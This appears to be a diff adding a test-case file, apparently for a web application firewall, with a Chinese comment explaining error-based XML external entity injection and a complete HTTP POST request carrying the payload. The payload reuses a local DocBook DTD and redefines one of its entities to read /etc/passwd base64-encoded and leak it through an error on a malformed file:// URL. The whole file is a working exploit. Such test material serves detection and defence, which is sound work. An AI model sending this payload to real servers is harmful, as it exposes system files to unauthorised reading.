@@ -1,0 +1,22 @@
+# XML外部实体注入_报错带外
+# 基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。
+POST /?bid=hd_tag_m8mv24mn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mn
+RM-PRO-Token: dff2fad22d69a5c5ca5ed9a5e262acfe
+RM-PRO-Time: 1742808393066
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;send;
+    '> 
+    %remote;
+]>
+<message>1234</message>
